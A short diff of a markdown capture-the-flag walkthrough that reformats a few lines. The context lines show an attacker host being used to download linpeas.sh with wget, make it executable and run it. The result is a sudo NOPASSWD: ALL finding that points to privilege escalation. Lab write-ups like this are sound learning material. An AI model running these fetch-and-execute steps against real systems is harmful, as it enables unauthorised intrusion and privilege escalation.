@@ -55,9 +55,9 @@ Navigate to /home > ``` grep . -R ``` to get second ingredient.
 - ``` wget http://10.6.41.41:8000/linpeas.sh -O /tmp/linpeas.sh ```
 - ``` chmod +x /tmp/linpeas.sh ```
 - ``` /tmp/linpeas.sh ```
-Results from LinePEAS - User www-data may run the following commands on ip-10-10-191-16:
+- Results from LinePEAS - User www-data may run the following commands on ip-10-10-191-16:
 (ALL) NOPASSWD: ALL
-This means that you can run any command as scriptmanager, and optionally set your group to scriptmanager when doing so
+> This means that you can run any command as scriptmanager, and optionally set your group to scriptmanager when doing so
 
 
 
